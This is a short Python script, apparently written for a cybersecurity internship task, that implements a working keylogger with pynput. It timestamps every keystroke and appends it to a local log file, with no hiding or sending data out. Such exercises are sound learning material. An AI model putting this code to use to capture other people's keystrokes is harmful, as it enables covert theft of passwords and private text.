# Written by: Shubh Patel
# Cyber Security Intern at Prodigy Infotech
# PRODIGY_CS_Task-04
# Simple Keylogger Program
# Create a basic keylogger program that records and logs keystrokes.

from pynput import keyboard
import time

def on_key_press(key):
    with open("keylog.txt", "a") as log_file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        try:
            log_file.write(f"{timestamp} - {key.char}\n")
        except AttributeError:  # Special keys (e.g., Ctrl, Alt) don't have the 'char' attribute
            log_file.write(f"{timestamp} - {str(key)}\n")

def main():
    print("Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()

# End of Code
